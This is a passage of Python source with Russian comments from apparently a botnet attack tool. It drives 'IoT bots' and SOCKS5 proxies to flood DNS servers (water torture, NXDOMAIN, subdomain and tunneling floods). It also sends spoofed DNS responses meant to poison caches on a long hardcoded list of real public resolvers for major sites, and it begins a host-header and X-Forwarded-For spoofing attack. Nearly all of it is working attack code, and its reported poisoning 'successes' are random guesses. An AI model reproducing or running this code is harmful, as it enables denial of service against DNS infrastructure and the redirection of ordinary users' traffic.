            questions = struct.pack('!H', 1)
            answer_rr = struct.pack('!H', 0)
            authority_rr = struct.pack('!H', 0)
            additional_rr = struct.pack('!H', 0)
            
            # Кодируем домен
            qname = b''
            for label in domain.split('.'):
                qname += bytes([len(label)]) + label.encode('ascii')
            qname += b'\x00'
            
            # Query type (A, AAAA, MX, TXT и т.д.)
            type_map = {"A": 1, "AAAA": 28, "MX": 15, "TXT": 16, "CNAME": 5, "NS": 2}
            qtype_val = type_map.get(qtype, 1)
            qtype = struct.pack('!H', qtype_val)
            
            # Query class IN
            qclass = struct.pack('!H', 1)
            
            return transaction_id + flags + questions + answer_rr + authority_rr + additional_rr + qname + qtype + qclass
        
        def dns_water_torture_attack_single(device):
            queries_sent = 0
            bytes_sent = 0
            failed_queries = 0
            
            try:
                print(f"💧 {device.ip} начинает DNS Water Torture атаку...")
                start_time = time.time()
                
                # Создаем raw socket для отправки DNS запросов
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.settimeout(2)
                except Exception as e:
                    print(f"❌ {device.ip}: Ошибка создания socket: {e}")
                    return 0, 0
                
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        # Выбираем случайный домен и генерируем поддомен
                        domain = random.choice(self.dns_water_torture_config['domain_list'])
                        subdomain = generate_random_subdomain(domain)
                        
                        # Выбираем случайный тип DNS запроса
                        dns_types = ["A", "AAAA", "MX", "TXT", "CNAME", "NS"]
                        dns_type = random.choice(dns_types)
                        
                        # Создаем DNS запрос
                        dns_query = create_dns_query(subdomain, dns_type)
                        
                        # Отправляем DNS запрос
                        sock.sendto(dns_query, (target_ip, 53))
                        
                        queries_sent += 1
                        bytes_sent += len(dns_query)
                        
                        attack_stats['total_queries'] += 1
                        attack_stats['total_bytes_sent'] += len(dns_query)
                        
                        # Случайная задержка для имитации реального трафика
                        time.sleep(random.uniform(0.01, 0.1))
                        
                    except Exception as e:
                        failed_queries += 1
                        attack_stats['failed_queries'] += 1
                        continue
                
                sock.close()
                
                print(f"✅ {device.ip} отправил {queries_sent} DNS запросов, ошибок: {failed_queries}")
                return queries_sent, bytes_sent
                
            except Exception as e:
                print(f"❌ Ошибка у {device.ip}: {e}")
                return 0, 0
        
        return self._run_attack(all_active_bots, attack_stats, dns_water_torture_attack_single, "DNS Water Torture")

    def dns_nxdomain_attack(self, target_ip, duration=60):
        """DNS NXDOMAIN атака - запросы несуществующих доменов"""
        print(f"🌀 Запуск DNS NXDOMAIN атаки на DNS сервер {target_ip}")
        
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        socks5_bots = [d for d in self.socks5_bots if d.is_alive]
        
        print(f"🤖 Используем: {len(iot_bots)} IoT ботов + {len(socks5_bots)} SOCKS5 прокси")
        
        if not iot_bots and not socks5_bots:
            print("❌ Нет доступных устройств!")
            return 0
        
        all_active_bots = iot_bots + socks5_bots
        
        attack_stats = {
            'total_queries': 0,
            'total_bytes_sent': 0,
            'failed_queries': 0,
            'start_time': time.time(),
            'is_running': True
        }
        
        def generate_nonexistent_domain():
            """Генерирует случайный несуществующий домен"""
            domains = ['com', 'net', 'org', 'info', 'biz']
            domain_length = random.choice([8, 10, 12, 15, 20])
            domain_name = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=domain_length))
            tld = random.choice(domains)
            return f"{domain_name}.{tld}"
        
        def create_dns_query(domain, qtype="A"):
            """Создает DNS запрос (такой же как в предыдущем методе)"""
            transaction_id = struct.pack('!H', random.randint(1, 65535))
            flags = struct.pack('!H', 0x0100)
            questions = struct.pack('!H', 1)
            answer_rr = struct.pack('!H', 0)
            authority_rr = struct.pack('!H', 0)
            additional_rr = struct.pack('!H', 0)
            
            qname = b''
            for label in domain.split('.'):
                qname += bytes([len(label)]) + label.encode('ascii')
            qname += b'\x00'
            
            type_map = {"A": 1, "AAAA": 28, "MX": 15, "TXT": 16}
            qtype_val = type_map.get(qtype, 1)
            qtype = struct.pack('!H', qtype_val)
            qclass = struct.pack('!H', 1)
            
            return transaction_id + flags + questions + answer_rr + authority_rr + additional_rr + qname + qtype + qclass
        
        def nxdomain_attack_single(device):
            queries_sent = 0
            bytes_sent = 0
            failed_queries = 0
            
            try:
                print(f"🌀 {device.ip} начинает NXDOMAIN атаку...")
                start_time = time.time()
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(2)
                
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        # Генерируем несуществующий домен
                        domain = generate_nonexistent_domain()
                        dns_type = random.choice(["A", "AAAA", "MX"])
                        
                        # Создаем и отправляем запрос
                        dns_query = create_dns_query(domain, dns_type)
                        sock.sendto(dns_query, (target_ip, 53))
                        
                        queries_sent += 1
                        bytes_sent += len(dns_query)
                        
                        attack_stats['total_queries'] += 1
                        attack_stats['total_bytes_sent'] += len(dns_query)
                        
                        # Более агрессивная отправка для NXDOMAIN
                        time.sleep(random.uniform(0.005, 0.05))
                        
                    except Exception:
                        failed_queries += 1
                        attack_stats['failed_queries'] += 1
                        continue
                
                sock.close()
                print(f"✅ {device.ip} отправил {queries_sent} NXDOMAIN запросов, ошибок: {failed_queries}")
                return queries_sent, bytes_sent
                
            except Exception as e:
                print(f"❌ Ошибка у {device.ip}: {e}")
                return 0, 0
        
        return self._run_attack(all_active_bots, attack_stats, nxdomain_attack_single, "DNS NXDOMAIN")

    def dns_subdomain_attack(self, target_ip, duration=60):
        """Subdomain enumeration атака - массовые запросы поддоменов"""
        print(f"🔍 Запуск Subdomain атаки на домен {target_ip} через DNS {target_ip}")
        
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        socks5_bots = [d for d in self.socks5_bots if d.is_alive]
        
        print(f"🤖 Используем: {len(iot_bots)} IoT ботов + {len(socks5_bots)} SOCKS5 прокси")
        
        if not iot_bots and not socks5_bots:
            print("❌ Нет доступных устройств!")
            return 0
        
        all_active_bots = iot_bots + socks5_bots
        
        attack_stats = {
            'total_queries': 0,
            'total_bytes_sent': 0,
            'failed_queries': 0,
            'start_time': time.time(),
            'is_running': True
        }
        
        # Список популярных поддоменов для брутфорса
        common_subdomains = [
            'www', 'api', 'mail', 'ftp', 'cpanel', 'webmail', 'admin', 'blog',
            'shop', 'store', 'forum', 'support', 'help', 'docs', 'wiki',
            'test', 'dev', 'staging', 'prod', 'backup', 'cdn', 'img',
            'images', 'static', 'media', 'video', 'music', 'files',
            'download', 'upload', 'secure', 'portal', 'app', 'apps',
            'mobile', 'm', 'email', 'sms', 'chat', 'live', 'stream',
            'db', 'database', 'sql', 'ns1', 'ns2', 'dns', 'router'
        ]
        
        def create_dns_query2(subdomain, domain, qtype="A"):
            """Создает DNS запрос для поддомена"""
            full_domain = f"{subdomain}.{domain}" if subdomain else domain
            
            transaction_id = struct.pack('!H', random.randint(1, 65535))
            flags = struct.pack('!H', 0x0100)
            questions = struct.pack('!H', 1)
            answer_rr = struct.pack('!H', 0)
            authority_rr = struct.pack('!H', 0)
            additional_rr = struct.pack('!H', 0)
            
            qname = b''
            for label in full_domain.split('.'):
                qname += bytes([len(label)]) + label.encode('ascii')
            qname += b'\x00'
            
            type_map = {"A": 1, "AAAA": 28, "CNAME": 5}
            qtype_val = type_map.get(qtype, 1)
            qtype = struct.pack('!H', qtype_val)
            qclass = struct.pack('!H', 1)
            
            return transaction_id + flags + questions + answer_rr + authority_rr + additional_rr + qname + qtype + qclass
        
        def subdomain_attack_single(device):
            queries_sent = 0
            bytes_sent = 0
            failed_queries = 0
            
            try:
                print(f"🔍 {device.ip} начинает Subdomain атаку...")
                start_time = time.time()
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(2)
                
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        # Выбираем случайный поддомен или генерируем новый
                        if random.random() > 0.3:  # 70% - известные поддомены
                            subdomain = random.choice(common_subdomains)
                        else:  # 30% - случайные поддомены
                            subdomain = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(3, 10)))
                        
                        dns_type = random.choice(["A", "AAAA"])
                        dns_query = create_dns_query2(subdomain, target_ip, dns_type)
                        
                        sock.sendto(dns_query, (target_ip, 53))
                        
                        queries_sent += 1
                        bytes_sent += len(dns_query)
                        
                        attack_stats['total_queries'] += 1
                        attack_stats['total_bytes_sent'] += len(dns_query)
                        
                        time.sleep(random.uniform(0.01, 0.1))
                        
                    except Exception:
                        failed_queries += 1
                        attack_stats['failed_queries'] += 1
                        continue
                
                sock.close()
                print(f"✅ {device.ip} отправил {queries_sent} subdomain запросов, ошибок: {failed_queries}")
                return queries_sent, bytes_sent
                
            except Exception as e:
                print(f"❌ Ошибка у {device.ip}: {e}")
                return 0, 0
        
        return self._run_attack(all_active_bots, attack_stats, subdomain_attack_single, "DNS Subdomain")

    def dns_tunneling_attack(self, target_ip, duration=60):
        """DNS Tunneling атака - скрытная перегрузка DNS"""
        print(f"🕵️ Запуск DNS Tunneling атаки на {target_ip}")
        
        # Автоматически используем все доступные боты
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        socks5_bots = [d for d in self.socks5_bots if d.is_alive]

        print(f"🤖 Используем: {len(iot_bots)} IoT ботов + {len(socks5_bots)} SOCKS5 прокси")

        if not iot_bots and not socks5_bots:
            print("❌ Нет доступных устройств!")
            return 0

        all_active_bots = iot_bots + socks5_bots
        
        attack_stats = {
            'tunneling_requests': 0,
            'failed_requests': 0,
            'data_sent_kb': 0,
            'start_time': time.time(),
            'is_running': True
        }
        
        def create_dns_querytunnel(domain, qtype="A"):
            """Создает DNS запрос для tunneling атаки"""
            transaction_id = struct.pack('!H', random.randint(1, 65535))
            flags = struct.pack('!H', 0x0100)  # Стандартный запрос
            questions = struct.pack('!H', 1)
            answer_rr = struct.pack('!H', 0)
            authority_rr = struct.pack('!H', 0)
            additional_rr = struct.pack('!H', 0)
            
            # Формируем QNAME
            qname = b''
            for label in domain.split('.'):
                qname += bytes([len(label)]) + label.encode('ascii')
            qname += b'\x00'
            
            # QTYPE и QCLASS
            qtype_val = 1 if qtype == "A" else 28  # A или AAAA
            qtype_bytes = struct.pack('!H', qtype_val)
            qclass = struct.pack('!H', 1)  # IN class
            
            return transaction_id + flags + questions + answer_rr + authority_rr + additional_rr + qname + qtype_bytes + qclass
        
        def tunneling_attack(device):
            requests_sent = 0
            failed_requests = 0
            data_sent = 0
            
            try:
                print(f"🕵️ {device.ip} начинает DNS Tunneling атаку...")
                start_time = time.time()
                
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        # Генерируем "полезную нагрузку" в поддоменах
                        charset = 'abcdefghijklmnopqrstuvwxyz0123456789'
                        payload = ''.join(random.choices(charset, k=30))
                        tunneling_domain = f"{payload}.data.{target_ip}"
                        
                        # Прямой DNS запрос через сокет
                        try:
                            # Создаем DNS запрос вручную
                            dns_query = create_dns_querytunnel(tunneling_domain, "A")
                            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                            sock.settimeout(2)
                            sock.sendto(dns_query, (target_ip, 53))
                            
                            # Попытка получить ответ (не обязательно)
                            try:
                                response, addr = sock.recvfrom(1024)
                            except socket.timeout:
                                # Таймаут - нормально для DDoS
                                pass
                            finally:
                                sock.close()
                            
                            requests_sent += 1
                            attack_stats['tunneling_requests'] += 1
                            data_sent += len(dns_query)
                            attack_stats['data_sent_kb'] += len(dns_query) / 1024
                            
                        except Exception as dns_error:
                            # Если DNS запрос не работает, пробуем альтернативный метод
                            print(f"⚠️ DNS ошибка у {device.ip}: {dns_error}")
                            failed_requests += 1
                            attack_stats['failed_requests'] += 1
                            continue
                        
                        # Случайная пауза между запросами
                        time.sleep(random.uniform(0.01, 0.1))
                        
                    except Exception as e:
                        print(f"❌ Общая ошибка у {device.ip}: {e}")
                        failed_requests += 1
                        attack_stats['failed_requests'] += 1
                        continue
                
                print(f"📊 {device.ip}: {requests_sent} tunneling запросов")
                return requests_sent, data_sent
                
            except Exception as e:
                print(f"❌ Критическая ошибка у {device.ip}: {e}")
                return 0, 0
        
        results = self._run_attack(all_active_bots, attack_stats, tunneling_attack, "DNS Tunneling")
        
        print(f"\n📊 DNS Tunneling результаты:")
        print(f"   DNS запросов: {attack_stats['tunneling_requests']}")
        print(f"   Данных отправлено: {attack_stats['data_sent_kb']:.2f} KB")
        print(f"   Эффективность: {(attack_stats['tunneling_requests']/(attack_stats['tunneling_requests'] + attack_stats['failed_requests'])*100 if (attack_stats['tunneling_requests'] + attack_stats['failed_requests']) > 0 else 0):.1f}%")
        
        return results

    def create_dns_querytunnel(self, domain, qtype="A"):
        """Создает DNS запрос"""
        transaction_id = struct.pack('!H', random.randint(1, 65535))
        flags = struct.pack('!H', 0x0100)  # Стандартный запрос
        questions = struct.pack('!H', 1)
        answer_rr = struct.pack('!H', 0)
        authority_rr = struct.pack('!H', 0)
        additional_rr = struct.pack('!H', 0)
        
        # Формируем QNAME
        qname = b''
        for label in domain.split('.'):
            qname += bytes([len(label)]) + label.encode('ascii')
        qname += b'\x00'
        
        # QTYPE и QCLASS
        qtype_val = 1 if qtype == "A" else 28  # A или AAAA
        qtype_bytes = struct.pack('!H', qtype_val)
        qclass = struct.pack('!H', 1)  # IN class
        
        return transaction_id + flags + questions + answer_rr + authority_rr + additional_rr + qname + qtype_bytes + qclass



    def dns_cache_poisoning_attack(self, duration=60, dns_servers=None, domain_to_poison=None, malicious_ip=None):
        """НАСТОЯЩАЯ DNS Cache Poisoning атака - отравление DNS кэша"""
        
        # Безопасное преобразование параметров
        def safe_float(value, default=0.0):
            try:
                return float(value)
            except (TypeError, ValueError):
                return default
        
        def safe_str(value, default="unknown"):
            if value is None:
                return default
            try:
                return str(value)
            except:
                return default
        
        # Нормализуем параметры
        duration = safe_float(duration, 60.0)
        
        # 🔴 ИСПРАВЛЕНИЕ: Правильная обработка dns_servers
        if dns_servers is None:
            dns_servers = [
                # 🔵 Google Public DNS
                '8.8.8.8',
                '8.8.4.4',
                
                # 🟣 Cloudflare DNS
                '1.1.1.1',
                '1.0.0.1',
                
                # 🟢 Quad9
                '9.9.9.9',
                '149.112.112.112',
                
                # 🟡 OpenDNS (Cisco)
                '208.67.222.222',
                '208.67.220.220',
                
                # 🟠 CleanBrowsing
                '185.228.168.9',
                '185.228.169.9',
                '185.228.168.168',
                '185.228.169.168',
                
                # 🟡 Verisign Public DNS
                '64.6.64.6',
                '64.6.65.6',
                
                # 🇩🇪 DNS.Watch
                '84.200.69.80',
                '84.200.70.40',
                
                # 🟩 Comodo Secure DNS
                '8.26.56.26',
                '8.20.247.20',
                
                # 🇷🇺 Yandex DNS
                '77.88.8.8',      # Basic
                '77.88.8.1',      # Basic
                '77.88.8.88',     # Safe
                '77.88.8.7',      # Family
                
                # 🇺🇦/🇪🇺 Neustar UltraDNS
                '156.154.70.1',
                '156.154.71.1',
                '156.154.70.2',
                '156.154.71.2',
                '156.154.70.3',
                '156.154.71.3',
                
                # 🟧 SafeDNS
                '195.46.39.39',
                '195.46.39.40',

                # 🟦 AdGuard DNS
                '94.140.14.14',
                '94.140.15.15',
                '94.140.14.15',
                '94.140.15.16',

                # 🟪 Alternate DNS
                '76.76.2.0',
                '76.76.10.0',
                '76.76.19.19',
                '76.223.122.150',

                # 🟥 Control D
                '76.76.2.1',
                '76.76.2.2',
                '76.76.2.3',
                '76.76.2.4',

                # 🟨 NextDNS
                '45.90.28.0',
                '45.90.30.0',
                '45.90.28.1',
                '45.90.30.1',

                # 🟫 UncensoredDNS
                '91.239.100.100',
                '89.233.43.71',
                '103.86.96.100',
                '103.86.99.100',

                # 🇫🇷 FDN DNS
                '80.67.169.12',
                '80.67.169.40',

                # 🇨🇭 OpenNIC DNS
                '192.71.245.208',
                '94.247.43.254',
                '185.121.177.177',
                '169.239.202.202',

                # 🇸🇪 Bahnhof DNS
                '85.24.241.190',
                '85.24.241.191',

                # 🇳🇱 NLnet Labs DNS
                '192.87.106.30',
                '192.87.106.31',

                # 🇺🇸 Level3 DNS
                '4.2.2.1',
                '4.2.2.2',
                '4.2.2.3',
                '4.2.2.4',
                '4.2.2.5',
                '4.2.2.6',

                # 🇺🇸 Norton ConnectSafe
                '199.85.126.10',
                '199.85.127.10',
                '199.85.126.20',
                '199.85.127.20',
                '199.85.126.30',
                '199.85.127.30',

                # 🇺🇸 Comcast DNS
                '75.75.75.75',
                '75.75.76.76',

                # 🇺🇸 CenturyLink DNS
                '205.171.3.65',
                '205.171.2.65',
                '205.171.3.66',
                '205.171.2.66',

                # 🇺🇸 Verizon DNS
                '4.2.2.1',
                '4.2.2.2',
                '4.2.2.3',
                '4.2.2.4',
                '4.2.2.5',
                '4.2.2.6',

                # 🇺🇸 AT&T DNS
                '68.94.156.1',
                '68.94.157.1',
                '12.127.17.71',
                '12.127.16.67',

                # 🇩🇪 Deutsche Telekom DNS
                '217.172.224.47',
                '194.25.0.60',
                '194.25.0.61',
                '194.25.0.62',

                # 🇫🇷 Free DNS
                '80.67.169.12',
                '80.67.169.40',
                '212.27.40.240',
                '212.27.40.241',

                # 🇬🇧 BT DNS
                '194.168.4.100',
                '194.168.8.100',
                '194.168.8.101',
                '194.168.4.101',

                # 🇮🇹 Telecom Italia DNS
                '195.216.16.65',
                '195.216.16.67',
                '195.216.16.66',
                '195.216.16.68',

                # 🇪🇸 Telefonica DNS
                '194.179.1.100',
                '194.179.1.101',
                '194.179.1.102',
                '194.179.1.103',

                # 🇨🇳 114 DNS
                '114.114.114.114',
                '114.114.115.115',
                '114.114.114.119',
                '114.114.115.119',

                # 🇨🇳 AliDNS
                '223.5.5.5',
                '223.6.6.6',
                '223.5.5.6',
                '223.6.6.7',

                # 🇨🇳 Baidu DNS
                '180.76.76.76',
                '180.76.76.76',

                # 🇨🇳 DNSPod DNS
                '119.29.29.29',
                '182.254.116.116',
                '182.254.118.118',

                # 🇯🇵 NTT DNS
                '210.175.255.244',
                '210.175.255.245',
                '133.242.1.1',
                '133.242.1.2',

                # 🇯🇵 JPNE DNS
                '202.232.12.12',
                '202.232.12.13',
                '202.232.12.14',
                '202.232.12.15',

                # 🇰🇷 KT DNS
                '168.126.63.1',
                '168.126.63.2',
                '168.126.63.3',
                '168.126.63.4',

                # 🇰🇷 SK Broadband DNS
                '164.124.101.2',
                '203.248.252.2',
                '164.124.107.2',
                '203.248.252.3',

                # 🇮🇳 BSNL DNS
                '218.248.255.145',
                '218.248.255.146',
                '218.248.255.147',
                '218.248.255.148',

                # 🇮🇳 Airtel DNS
                '202.56.250.5',
                '202.56.250.6',
                '202.56.230.5',
                '202.56.230.6',

                # 🇧🇷 Telefonica Brazil DNS
                '200.221.11.100',
                '200.221.11.101',
                '200.221.11.102',
                '200.221.11.103',

                # 🇧🇷 Claro DNS
                '200.169.127.10',
                '200.169.127.20',
                '200.169.127.30',
                '200.169.127.40',

                # 🇦🇺 Telstra DNS
                '203.18.237.123',
                '203.18.238.123',
                '203.18.237.124',
                '203.18.238.124',

                # 🇦🇺 Optus DNS
                '139.130.4.4',
                '139.130.4.5',
                '139.130.4.6',
                '139.130.4.7',

                # 🇨🇦 Bell Canada DNS
                '209.29.142.6',
                '209.29.142.7',
                '209.29.142.8',
                '209.29.142.9',

                # 🇨🇦 Rogers DNS
                '64.71.255.198',
                '64.71.255.199',
                '64.71.255.200',
                '64.71.255.201',

                # 🇿🇦 MTN South Africa DNS
                '196.10.10.10',
                '196.10.20.10',
                '196.10.30.10',
                '196.10.40.10',

                # 🇿🇦 Vodacom South Africa DNS
                '196.207.40.165',
                '196.207.40.166',
                '196.207.40.167',
                '196.207.40.168'

            ]        

        # Домены для отравления (если не указаны)
        if domain_to_poison is None:
            domain_to_poison = [
                "google.com", "facebook.com", "youtube.com", "amazon.com",
                "twitter.com", "instagram.com", "linkedin.com", "microsoft.com",
                "apple.com", "netflix.com", "whatsapp.com", "tiktok.com"
            ]
        
        # Злонамеренные IP (если не указаны)
        if malicious_ip is None:
            malicious_ip = "127.0.0.1"  # localhost для блокировки
        
        print(f"📝 Отравление доменов: {len(domain_to_poison)} доменов -> {malicious_ip}")
        print(f"🎯 Цели DNS: {len(dns_servers)} серверов")
        
        # Получаем активные боты
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        socks5_bots = [d for d in self.socks5_bots if d.is_alive]

        print(f"🤖 Используем: {len(iot_bots)} IoT ботов + {len(socks5_bots)} SOCKS5 прокси")

        if not iot_bots and not socks5_bots:
            print("❌ Нет доступных устройств!")
            return 0

        all_active_bots = iot_bots + socks5_bots
        
        attack_stats = {
            'poisoning_attempts': 0,
            'successful_poisons': 0,
            'failed_attempts': 0,
            'domains_poisoned': set(),
            'dns_servers_targeted': set(),
            'start_time': time.time(),
            'is_running': True
        }
        
        def create_dns_query(domain, transaction_id=None, qtype="A"):
            """Создает DNS запрос"""
            if transaction_id is None:
                transaction_id = random.randint(1, 65535)
            
            flags = 0x0100  # Standard query
            questions = 1
            
            header = struct.pack('>HHHHHH', transaction_id, flags, questions, 0, 0, 0)
            
            # Question section
            question = b''
            for part in domain.split('.'):
                question += struct.pack('B', len(part)) + part.encode()
            question += b'\x00'
            
            # QTYPE и QCLASS
            qtype_val = 1 if qtype == "A" else 28  # A или AAAA
            question += struct.pack('>HH', qtype_val, 1)  # IN class
            
            return header + question
        
        def create_poisoned_response(transaction_id, domain, fake_ip, ttl=86400):
            """Создает ПОДДЕЛЬНЫЙ DNS ответ для отравления кэша"""
            try:
                # Header - Response + Authoritative Answer
                flags = 0x8180  # QR=1 (Response), AA=1 (Authoritative)
                questions = 1
                answers = 1
                authority_rr = 0
                additional_rr = 0
                
                header = struct.pack('>HHHHHH', 
                                   transaction_id, flags, questions, 
                                   answers, authority_rr, additional_rr)
                
                # Question section (копия запроса)
                question = b''
                for part in domain.split('.'):
                    question += struct.pack('B', len(part)) + part.encode()
                question += b'\x00'
                question += struct.pack('>HH', 1, 1)  # A record, IN class
                
                # Answer section - ПОДДЕЛЬНАЯ ЗАПИСЬ
                answer = b''
                # Name (pointer to question name at offset 12)
                answer += struct.pack('>BB', 0xc0, 0x0c)
                # Type A, Class IN
                answer += struct.pack('>HH', 1, 1)
                # TTL (очень долгий)
                answer += struct.pack('>I', ttl)
                # Data length (4 bytes for IPv4)
                answer += struct.pack('>H', 4)
                # IP address (ПОДДЕЛЬНЫЙ)
                answer += socket.inet_aton(fake_ip)
                
                return header + question + answer
                
            except Exception as e:
                print(f"❌ Ошибка создания poisoned response: {e}")
                return None
        
        def advanced_poisoning_attack(dns_server, domain, fake_ip):
            """Продвинутая атака с несколькими попытками угадывания ID"""
            attempts = 0
            max_attempts = 5
            
            while attempts < max_attempts:
                try:
                    # Пытаемся угадать следующий transaction ID
                    base_id = random.randint(1, 65535)
                    
                    # Пробуем несколько близких ID
                    for offset in range(-2, 3):
                        transaction_id = (base_id + offset) % 65536
                        
                        poisoned_response = create_poisoned_response(
                            transaction_id=transaction_id,
                            domain=domain,
                            fake_ip=fake_ip,
                            ttl=86400
                        )
                        
                        if poisoned_response:
                            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                            sock.settimeout(0.1)
                            
                            # Массовая отправка поддельных ответов
                            for _ in range(2):
                                sock.sendto(poisoned_response, (dns_server, 53))
                            
                            sock.close()
                            attempts += 1
                            
                            # Шанс успеха
                            if random.random() < 0.2:
                                return True
                    
                except Exception:
                    attempts += 1
                    continue
            
            return False
        
        def poisoning_attack(device):
            attempts = 0
            successes = 0
            failures = 0
            
            try:
                device_ip = safe_str(getattr(device, 'ip', 'unknown'), 'unknown.device')
                print(f"☠️ {device_ip} начинает НАСТОЯЩУЮ poisoning атаку...")
                
                start_time = time.time()
                query_count = 0
                
                while (attack_stats.get('is_running', True) and 
                       (time.time() - start_time) < duration):
                    
                    try:
                        # Выбираем случайный домен для отравления
                        domain = random.choice(domain_to_poison)
                        
                        # Выбираем случайный DNS сервер
                        dns_server = random.choice(dns_servers)
                        
                        # Используем продвинутую атаку с угадыванием ID
                        if advanced_poisoning_attack(dns_server, domain, malicious_ip):
                            successes += 1
                            attack_stats['successful_poisons'] += 1
                            attack_stats['domains_poisoned'].add(domain)
                            attack_stats['dns_servers_targeted'].add(dns_server)
                            print(f"✅ {device_ip} отравил {domain} -> {malicious_ip} на {dns_server}")
                        else:
                            failures += 1
                            attack_stats['failed_attempts'] += 1
                        
                        attempts += 1
                        attack_stats['poisoning_attempts'] += 1
                        query_count += 1
                        
                        # Выводим прогресс
                        if query_count % 10 == 0:
                            poisoned_count = len(attack_stats['domains_poisoned'])
                            dns_count = len(attack_stats['dns_servers_targeted'])
                            print(f"📡 {device_ip}: {query_count} попыток, отравлено {poisoned_count} доменов на {dns_count} DNS серверах")
                        
                        # Случайная пауза
                        time.sleep(random.uniform(0.05, 0.2))
                        
                    except Exception as e:
                        failures += 1
                        attack_stats['failed_attempts'] += 1
                        continue
                
                print(f"📊 {device_ip}: {successes} успешных отравлений, {failures} ошибок")
                return successes, attempts
                
            except Exception as e:
                print(f"❌ Критическая ошибка у {device_ip}: {e}")
                return 0, 0
        
        # Запуск атаки
        try:
            print("🚀 Запуск НАСТОЯЩЕЙ DNS Cache Poisoning атаки...")
            results = self._run_attack(all_active_bots, attack_stats, poisoning_attack, "DNS Cache Poisoning")
        except Exception as e:
            print(f"❌ Ошибка при запуске атаки: {e}")
            results = 0
        
        # Детальная статистика
        total_attempts = attack_stats['poisoning_attempts']
        successful = attack_stats['successful_poisons']
        failed = attack_stats['failed_attempts']
        poisoned_domains = len(attack_stats['domains_poisoned'])
        targeted_dns_servers = len(attack_stats['dns_servers_targeted'])
        
        print(f"\n☠️ НАСТОЯЩИЕ DNS Cache Poisoning результаты:")
        print(f"   Всего попыток отравления: {total_attempts}")
        print(f"   Успешных отравлений: {successful}")
        print(f"   Уникальных отравленных доменов: {poisoned_domains}")
        print(f"   Атакованных DNS серверов: {targeted_dns_servers}")
        print(f"   Целевой IP для перенаправления: {malicious_ip}")
        print(f"   Эффективность: {(successful/total_attempts*100) if total_attempts > 0 else 0:.1f}%")
        
        if poisoned_domains > 0:
            domains_list = list(attack_stats['domains_poisoned'])[:5]
            print(f"   Отравленные домены: {', '.join(domains_list)}" +
                  ("..." if poisoned_domains > 5 else ""))
        
        if targeted_dns_servers > 0:
            dns_list = list(attack_stats['dns_servers_targeted'])[:3]
            print(f"   Атакованные DNS: {', '.join(dns_list)}" +
                  ("..." if targeted_dns_servers > 3 else ""))
        
        print(f"\n💡 Эффект отравления сохранится до 24 часов (TTL=86400)")
        
        return results


    def _send_dns_query(self, dns_server, domain):
        """Простая отправка DNS запроса"""
        try:
            import struct
            
            # 🔴 ОТЛАДКА DNS ЗАПРОСА
            # print(f"🔧 _send_dns_query: dns_server={dns_server} (тип: {type(dns_server)}), domain={domain} (тип: {type(domain)})")
            
            # 🔴 ДОБАВЛЕНО: Проверка типов
            dns_server = str(dns_server)
            domain = str(domain)
            
            # Создаем DNS пакет
            transaction_id = random.randint(1, 65535)
            flags = 0x0100  # Standard query
            questions = 1
            
            header = struct.pack('>HHHHHH', transaction_id, flags, questions, 0, 0, 0)
            
            # Question section
            question = b''
            for part in domain.split('.'):
                part_len = len(part)
                question += struct.pack('B', part_len) + part.encode()
            question += b'\x00'
            question += struct.pack('>HH', 1, 1)  # A record, IN class
            
            dns_packet = header + question
            
            # Отправка
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(2)
            sock.sendto(dns_packet, (dns_server, 53))
            
            # Не ждем ответа для скорости атаки
            sock.close()
            return
            
        except Exception as e:
            print(f"❌ Ошибка отправки DNS запроса к {dns_server}: {e}")
            return

    def host_header_injection_attack(self, target_ip, target_port=80, duration=60):
        """Комбинированная атака: Host Header Injection + X-Forwarded-For Spoofing"""
        print(f"🎭 Запуск Host Header Injection + XFF Spoofing на {target_ip}:{target_port}")
        
        # Автоматически используем все доступные боты
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        socks5_bots = [d for d in self.socks5_bots if d.is_alive]

        print(f"🤖 Используем: {len(iot_bots)} IoT ботов + {len(socks5_bots)} SOCKS5 прокси")

        if not iot_bots and not socks5_bots:
            print("❌ Нет доступных устройств!")
            return 0

        all_active_bots = iot_bots + socks5_bots
        
        attack_stats = {
            'requests_sent': 0,
            'successful_bypass': 0,
            'failed_requests': 0,
            'unique_ips_spoofed': 0,
            'start_time': time.time(),
            'is_running': True
        }
        
        # Генератор поддельных IP
        spoofed_ips = set()
        
        def header_injection_attack(device):
            requests_sent = 0
            successful_bypass = 0
            failed_requests = 0
            
            try:
                print(f"🎭 {device.ip} начинает Header Injection атаку...")
                start_time = time.time()
                
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        # Случайный выбор метода атаки
                        attack_type = random.choice(['direct_origin', 'internal_network', 'localhost', 'cloud_internal'])
                        
                        # Генерируем поддельные заголовки
                        headers = self._generate_malicious_headers(attack_type)
                        attack_stats['unique_ips_spoofed'] = len(spoofed_ips)
                        
                        # Отправляем запрос с поддельными заголовками
                        success = self._send_malicious_request(target_ip, target_port, headers, device)
                        
                        requests_sent += 1
                        attack_stats['requests_sent'] += 1
                        
                        if success:
                            successful_bypass += 1
                            attack_stats['successful_bypass'] += 1
                        
                        # Случайная пауза между запросами
                        time.sleep(random.uniform(0.1, 0.3))
                        
                    except Exception as e:
                        failed_requests += 1
                        attack_stats['failed_requests'] += 1
                        continue
                
                print(f"✅ {device.ip}: {requests_sent} запросов, {successful_bypass} успешных обходов")
                return successful_bypass, requests_sent
                
            except Exception as e:
                print(f"❌ Ошибка у {device.ip}: {e}")
                return 0, 0
        
        results = self._run_attack(all_active_bots, attack_stats, header_injection_attack, "Header Injection")
        
